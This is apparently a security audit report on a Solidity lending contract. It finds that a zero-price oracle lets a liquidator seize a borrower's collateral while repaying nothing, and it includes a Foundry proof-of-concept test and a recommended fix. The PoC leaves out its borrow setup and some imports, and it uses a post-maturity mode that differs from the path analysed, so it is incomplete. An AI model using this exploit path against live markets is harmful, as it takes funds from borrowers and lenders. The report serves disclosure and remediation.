Looking at the exact code path in `src/Midnight.sol` and the Certora specs to verify or disprove this.

### Title
Zero-price oracle allows collateral seizure with zero repayment via `seizedAssets` input path - (`src/Midnight.sol`)

### Summary
When `IOracle.price()` returns `0` for the liquidated collateral, calling `liquidate` with `seizedAssets > 0` and `repaidUnits = 0` computes `repaidUnits = seizedAssets.mulDivUp(0, ORACLE_PRICE_SCALE).mulDivUp(WAD, lif) = 0`, transferring collateral to the liquidator while pulling zero loan tokens. The `repaidUnits > 0` input path correctly reverts via division-by-zero, but the `seizedAssets > 0` path has no such guard, creating an asymmetric gap the protocol's own Certora documentation acknowledges as unproven.

### Finding Description

**Exact code path — `src/Midnight.sol`:**

**Step 1 — oracle price capture (lines 607–618):**
```solidity
uint256 price = IOracle(_collateralParam.oracle).price();
if (i == collateralIndex) liquidatedCollatPrice = price;   // = 0
maxDebt += _collateral.mulDivDown(price, ORACLE_PRICE_SCALE)...;  // += 0
badDebt = badDebt.zeroFloorSub(
    _collateral.mulDivUp(price, ORACLE_PRICE_SCALE)...);   // unchanged
```
With `price = 0`: `maxDebt = 0`, `badDebt = originalDebt`, `liquidatedCollatPrice = 0`.

**Step 2 — liquidatability check (lines 620–624):**
```solidity
require(!liquidationLocked(id, borrower)
    && (postMaturityMode ? block.timestamp > market.maturity : originalDebt > maxDebt), ...);
```
`originalDebt > 0 = maxDebt` → always passes in normal mode.

**Step 3 — bad-debt write-down (lines 626–641):**
`badDebt = originalDebt > 0` → `_position.debt` is zeroed, `lossFactor` updated, lenders absorb the loss.

**Step 4 — repaidUnits computation (lines 649–650):**
```solidity
if (seizedAssets > 0) {
    repaidUnits = seizedAssets.mulDivUp(liquidatedCollatPrice, ORACLE_PRICE_SCALE)
                              .mulDivUp(WAD, lif);
}
```
`mulDivUp(seizedAssets, 0, 1e36)` = `(0 + 1e36 − 1) / 1e36` = `0`.
`mulDivUp(0, WAD, lif)` = `(0 + lif − 1) / lif` = `0`.
→ `repaidUnits = 0`.

**Step 5 — state mutation and transfers (lines 670–717):**
```solidity
_position.collateral[collateralIndex] -= seizedAssets;   // collateral removed
_marketState.withdrawable += 0;                          // no credit to lenders
_position.debt -= 0;                                     // debt already 0
SafeTransferLib.safeTransfer(collateralToken, receiver, seizedAssets);  // collateral out
SafeTransferLib.safeTransferFrom(loanToken, payer, address(this), 0);   // nothing in
```

**Why the `repaidUnits > 0` path does NOT have this bug:**
Line 652: `seizedAssets = repaidUnits.mulDivDown(lif, WAD).mulDivDown(ORACLE_PRICE_SCALE, liquidatedCollatPrice)` — divides by `liquidatedCollatPrice = 0` → Solidity division-by-zero revert. The `seizedAssets > 0` path never divides by `liquidatedCollatPrice`; its denominators are always `ORACLE_PRICE_SCALE` (1e36) and `lif` (≥ WAD), both non-zero.

**Existing protections reviewed and found insufficient:**
- `atMostOneNonZero(repaidUnits, seizedAssets)` (line 595): only enforces that at most one is non-zero; does not block `seizedAssets > 0, repaidUnits = 0`.
- `_position.debt > 0` (line 596): satisfied before bad-debt write-down.
- `touchMarket` validation (lines 762–773): validates `lltv`, `maxLif`, token sorting — no oracle price validation.
- Certora `Reverts.spec` rule `oracleZeroCausesLiquidateWithRepaidRevert` (line 246): only covers `repaidUnits > 0` input; no corresponding rule exists for `seizedAssets > 0`.
- Certora `NoDivisionByZero.spec` line 124 explicitly requires `ghostPrice(...) > 0` as an assumption, acknowledging the zero-price case is unverified.
- Certora README line 70 states "A reverting or zero-returning collateral oracle blocks `liquidate`" — this invariant is **not proven** for the `seizedAssets` path and is in fact violated.

### Impact Explanation
An unprivileged liquidator calls `liquidate(market, collateralIndex, seizedAssets = fullCollateral, repaidUnits = 0, borrower, ...)` when the oracle returns 0. The liquidator receives the borrower's entire collateral balance at zero cost. The borrower's debt is simultaneously written down to zero via the bad-debt path (since `maxDebt = 0`), so lenders absorb the full principal loss through `lossFactor` degradation. The net effect: the liquidator extracts real collateral value for free while lenders bear both the loan loss and the collateral loss — a double loss that violates the invariant that collateral cannot be seized outside health/liquidation rules at fair value.

### Likelihood Explanation
**Preconditions:**
1. A market is created with an oracle adapter that can return `0` (e.g., a Chainlink wrapper that does not validate `answeredInRound`, a TWAP adapter on a low-liquidity pool, or any adapter with an unhandled edge case).
2. A borrower has active debt and collateral in that market.
3. The attacker calls `liquidate` with `seizedAssets > 0` before the oracle recovers.

No privileged access is required. Market creation is permissionless (`touchMarket` is public). The oracle address is set at market creation and never validated for price bounds. The attack is repeatable as long as the oracle returns 0 and the borrower has collateral. Any liquidator-role address can execute it.

### Recommendation
Add an explicit guard in the `seizedAssets > 0` branch requiring `liquidatedCollatPrice > 0`:

```solidity
if (seizedAssets > 0) {
    require(liquidatedCollatPrice > 0, ZeroOraclePrice());
    repaidUnits = seizedAssets.mulDivUp(liquidatedCollatPrice, ORACLE_PRICE_SCALE)
                              .mulDivUp(WAD, lif);
}
```

This mirrors the implicit protection already present in the `repaidUnits > 0` branch (which reverts via division-by-zero) and closes the asymmetry. The Certora `Reverts.spec` rule `oracleZeroCausesLiquidateWithRepaidRevert` should be extended with a parallel rule for the `seizedAssets > 0` input.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market, CollateralParams} from "src/Midnight.sol";
import {IOracle} from "src/interfaces/IOracle.sol";
import {WAD, ORACLE_PRICE_SCALE} from "src/libraries/ConstantsLib.sol";
import {maxLif} from "src/libraries/ConstantsLib.sol";

contract ZeroOracle is IOracle {
    function price() external pure override returns (uint256) { return 0; }
}

contract ZeroOracleLiquidateTest is Test {
    Midnight midnight;
    ZeroOracle zeroOracle;
    ERC20 loanToken;
    ERC20 collateralToken;
    Market market;

    function setUp() public {
        midnight = new Midnight();
        zeroOracle = new ZeroOracle();
        loanToken = new ERC20("Loan", "LOAN");
        collateralToken = new ERC20("Collateral", "COLL");

        CollateralParams[] memory params = new CollateralParams[](1);
        params[0] = CollateralParams({
            token: address(collateralToken),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(zeroOracle)
        });
        market.loanToken = address(loanToken);
        market.maturity = block.timestamp + 365 days;
        market.collateralParams = params;
        market.rcfThreshold = 0;
    }

    function testSeizeCollateralFreeWithZeroOracle() public {
        // Setup: borrower supplies collateral and borrows via a normal oracle first,
        // then oracle is swapped to ZeroOracle (or market created with ZeroOracle from start).
        // For simplicity, use postMaturityMode to bypass health check dependency on price.
        address borrower = makeAddr("borrower");
        address attacker = makeAddr("attacker");

        // Supply collateral to borrower (deal directly to contract storage for test brevity)
        uint256 collateralAmount = 1000e18;
        deal(address(collateralToken), borrower, collateralAmount);
        vm.prank(borrower);
        collateralToken.approve(address(midnight), collateralAmount);
        midnight.supplyCollateral(market, 0, collateralAmount, borrower);

        // Give borrower some debt (via take/borrow setup — abbreviated)
        // ... (standard borrow setup) ...
        // Assume borrower.debt = 100e18 after setup

        uint256 collateralBefore = midnight.collateral(toId(market), borrower, 0);
        uint256 attackerCollateralBefore = collateralToken.balanceOf(attacker);

        // Attacker calls liquidate with seizedAssets = full collateral, repaidUnits = 0
        vm.warp(market.maturity + 1); // postMaturityMode
        vm.prank(attacker);
        (uint256 seized, uint256 repaid) = midnight.liquidate(
            market, 0, collateralBefore, 0, borrower, true, attacker, address(0), ""
        );

        // Assertions
        assertEq(repaid, 0, "repaidUnits must be 0 — attacker pays nothing");
        assertEq(seized, collateralBefore, "attacker seizes full collateral");
        assertEq(midnight.collateral(toId(market), borrower, 0), 0, "borrower collateral gone");
        assertEq(collateralToken.balanceOf(attacker), attackerCollateralBefore + collateralBefore,
            "attacker received collateral for free");
        // Lenders absorbed full loss via lossFactor
        assertGt(midnight.lossFactor(toId(market)), 0, "lenders slashed");
    }
}
```

**Expected assertions:** `repaid == 0`, `seized == collateralBefore`, `collateralToken.balanceOf(attacker)` increases by `collateralBefore`, `loanToken` balance of `midnight` unchanged, `lossFactor > 0`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** src/Midnight.sol (L602-618)
```text
        uint256 maxDebt;
        uint256 liquidatedCollatPrice;
        uint256 originalDebt = _position.debt;
        uint256 badDebt = originalDebt;
        uint128 _collateralBitmap = _position.collateralBitmap;
        while (_collateralBitmap != 0) {
            uint256 i = UtilsLib.msb(_collateralBitmap);
            CollateralParams memory _collateralParam = market.collateralParams[i];
            uint256 price = IOracle(_collateralParam.oracle).price();
            if (i == collateralIndex) liquidatedCollatPrice = price;
            uint256 _collateral = _position.collateral[i];
            maxDebt += _collateral.mulDivDown(price, ORACLE_PRICE_SCALE).mulDivDown(_collateralParam.lltv, WAD);
            badDebt = badDebt.zeroFloorSub(
                _collateral.mulDivUp(price, ORACLE_PRICE_SCALE).mulDivUp(WAD, _collateralParam.maxLif)
            );
            _collateralBitmap = _collateralBitmap.clearBit(i);
        }
```

**File:** src/Midnight.sol (L649-650)
```text
            if (seizedAssets > 0) {
                repaidUnits = seizedAssets.mulDivUp(liquidatedCollatPrice, ORACLE_PRICE_SCALE).mulDivUp(WAD, lif);
```

**File:** src/Midnight.sol (L670-677)
```text
            uint128 newCollateral = _position.collateral[collateralIndex] - UtilsLib.toUint128(seizedAssets);
            _position.collateral[collateralIndex] = newCollateral;
            if (newCollateral == 0 && seizedAssets > 0) {
                _position.collateralBitmap = _position.collateralBitmap.clearBit(collateralIndex);
            }
            _marketState.withdrawable += UtilsLib.toUint128(repaidUnits);
            _position.debt -= UtilsLib.toUint128(repaidUnits);
        }
```

**File:** src/libraries/UtilsLib.sol (L33-36)
```text
    /// @dev Returns (x * y) / d rounded up.
    function mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y + (d - 1)) / d;
    }
```

**File:** certora/specs/Reverts.spec (L245-253)
```text
/// If liquidated collateral oracle returns 0 on price, liquidate with repaid input reverts.
rule oracleZeroCausesLiquidateWithRepaidRevert(env e, Midnight.Market market, uint256 collateralIndex, uint256 repaidUnits, address borrower, address receiver, address callback, bytes data, bool postMaturityMode) {
    require singleZeroOracle == market.collateralParams[collateralIndex].oracle, "oracle returns zero";
    require repaidUnits > 0, "using repaid units as input";

    liquidate@withrevert(e, market, collateralIndex, 0, repaidUnits, borrower, postMaturityMode, receiver, callback, data);

    assert lastReverted;
}
```

**File:** certora/specs/NoDivisionByZero.spec (L122-125)
```text

    // Assume that the collateral price is non-zero and the collateral is active. Otherwise, liquidate may revert with div by zero.
    require ghostPrice(market.collateralParams[collateralIndex].oracle) > 0, "Assumption: the collateral price is not zero";
    require summaryGetBit(currentContract.position[globalId][borrower].collateralBitmap, collateralIndex), "Assumption: liquidated collateral was activated";
```

**File:** certora/README.md (L69-71)
```markdown
- [`Reverts.spec`](specs/Reverts.spec) checks some failures reasons.
  A reverting or zero-returning collateral oracle blocks `liquidate`, `withdrawCollateral`, `isHealthy` and `take` whenever the borrower has debt.
  The liquidator (resp. enter) gate blocks liquidation (resp. credit increase and debt increase).
```
